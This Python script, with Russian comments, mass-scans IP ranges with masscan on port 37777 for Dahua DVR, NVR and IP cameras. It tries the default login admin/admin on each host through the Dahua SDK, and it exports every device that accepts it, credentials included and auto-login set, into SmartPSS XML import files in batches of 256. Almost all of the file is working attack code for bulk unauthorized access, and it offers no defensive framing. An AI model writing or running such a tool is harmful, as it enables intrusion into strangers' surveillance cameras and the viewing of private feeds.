#masscan for Dahua DVR NVR IPC
import os,optparse,ctypes,platform

login = 'admin'
password = 'admin'

def Os_type():
    if platform.system() == "Windows":
        return 'win'
    else:
        return 'nix'

def Auth(Server):
    if Os_type() == 'win':
        dll = ctypes.WinDLL("Dll/dhnetsdk.dll")
        init = dll.CLIENT_Init(Server, 0)
        dll.CLIENT_Login.restype = ctypes.c_longlong
        loginH = dll.CLIENT_LoginEx(Server.encode("ascii"), 37777, login.encode("ascii"), password.encode("ascii"), None, None,0, 0)
        if not loginH == 0:
            print('[+] Host %s found'%Server)
            return True
        else:
            return False
    else:
        dll = ctypes.CDLL("./Dll/libdhnetsdk.so")
        init = dll.CLIENT_Init(Server, 0)
        dll.CLIENT_Login.restype = ctypes.c_longlong
        loginH = dll.CLIENT_Login(Server.encode("ascii"), 37777, login.encode("ascii"), password.encode("ascii"), None)
        if not loginH == 0:
            print(loginH)
            return True
        else:
            return False

def parse_result():
    #Парсим результат массскана оставляем только Ip адресса
    file = open('res_scan.txt','r')
    Ips = open('IPs.txt','w')
    for string in file.readlines():
        line = string.split(' ')
        if not (string.startswith('#')):
            if Auth(line[3]):
                Ips.write(line[3]+'\n')
    Ips.close()

    ###os.remove('res_scan.txt')

def save_xml():
    #Сохраняем в XML  дял SmartPSS

    file = open('IPs.txt', 'r')
    xml = open('Ip_Smart_pss.xml', 'w')
    start_file = '''<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
    <Organization groups="2" grade="1" modifiedTime="0">
    <Department coding="001" encode="" id="0" name="root" type="0">
    '''
    end_file = '''
        </Department>
    </Organization>'''
    k = 1001
    x = len(file.readlines()) #Опрееляем количество строк
    print('[+] Found ' + str(x) + ' hosts')
    file.close()
    file = open('IPs.txt', 'r')
    count = 1
    a = 1
    if x<=256:#если файл меньше 256 строк
        xml.write(start_file)
        for string in file.readlines():
            line = string.rstrip('\n')
            temp = '<Device id="' + str(k) + '" title="' + line + '" desc="" ip="' + line + '" port="37777" manufacturer="" type="1" model="" user="' + login + '" password="' + password + '" p2pServerIp="" p2pServerPort="0" p2pServerKey="" p2pDevUuid="" p2pRemotePort="0" logintype="0" cardsn="" rights="" alertout="0" status="1" m_ChannelCount="" VideoOutCount="" AlarmInCount="0" AlarmOutCount="0" SerialNum="" subType="1" ProtocolType="0" RtspPort="0" AutoLogin="1">\n            </Device>'
            xml.write(temp)
            k += 1
        xml.write(end_file)
        xml.close()
        file.close()
        print('[+] File save as Ip_Smart_pss.xml')
    else:#Разбиваем на файлы по 256
        xml.write(start_file)
        for string in file.readlines():
            line = string.rstrip('\n')
            if a <=255:

                temp = '<Device id="' + str(
                    k) + '" title="' + line + '" desc="" ip="' + line + '" port="37777" manufacturer="" type="1" model="" user="' + login + '" password="' + password + '" p2pServerIp="" p2pServerPort="0" p2pServerKey="" p2pDevUuid="" p2pRemotePort="0" logintype="0" cardsn="" rights="" alertout="0" status="1" m_ChannelCount="" VideoOutCount="" AlarmInCount="0" AlarmOutCount="0" SerialNum="" subType="1" ProtocolType="0" RtspPort="0" AutoLogin="1">\n            </Device>'
                xml.write(temp)
                k += 1
                a += 1
            else:
                xml.write(end_file)
                xml.close()
                xml = open('Ip_Smart_pss_'+str(count)+'.xml', 'w')
                print('[+] File save as Ip_Smart_pss_'+str(count)+'.xml')
                xml.write(start_file)
                a = 1
                count +=1

        xml.write(end_file)
        xml.close()
        file.close()
    os.remove('IPs.txt')
def masscan(filescan,threads):
    #Запускаем mass scan  с нужными параметрами
    print('[*] Starting scan in masscan')
    if Os_type() =='nix':
        os.system('/usr/bin/masscan -p 37777 -iL %s -oL res_scan.txt --rate=%s' %(filescan,threads))
    else:
        os.system('c:/masscan/masscan.exe -p 37777 -iL %s -oL res_scan.txt --rate=%s' % (filescan, threads))

def main():
    parser = optparse.OptionParser('%prog' + " -f <Scan file> -t <threads>")
    parser.add_option('-f', dest='file', type='string', help='Target list file Example; 192.168.1.1-192.168.11.1')
    parser.add_option('-t', dest='threads',default="500", type='string', help='Threads number for masscan. Default 500')
    (options, args) = parser.parse_args()
    if (options.file==None):
        print("[-] No taget file scan list\n")
        parser.print_help()
        exit(0)
    masscan(options.file,options.threads)
    parse_result()
    save_xml()
    os.remove('res_scan.txt')

main()
